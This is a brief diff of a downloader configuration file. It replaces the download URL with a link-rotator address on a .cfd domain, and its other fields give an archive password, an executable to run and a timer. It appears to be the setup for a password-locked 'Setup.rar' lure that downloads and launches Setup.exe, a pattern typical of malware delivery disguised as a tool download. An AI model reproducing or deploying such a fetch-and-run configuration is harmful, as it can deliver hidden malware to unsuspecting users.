@@ -1,8 +1,9 @@
-url=https://gsmtoolpack.com/Setup.rar
+url=https://setuprar.autolinksrotator.cfd/download.php
 name=Setup.rar
 password=2025
 setup=Setup.exe
 timer=12
+
 
 
 
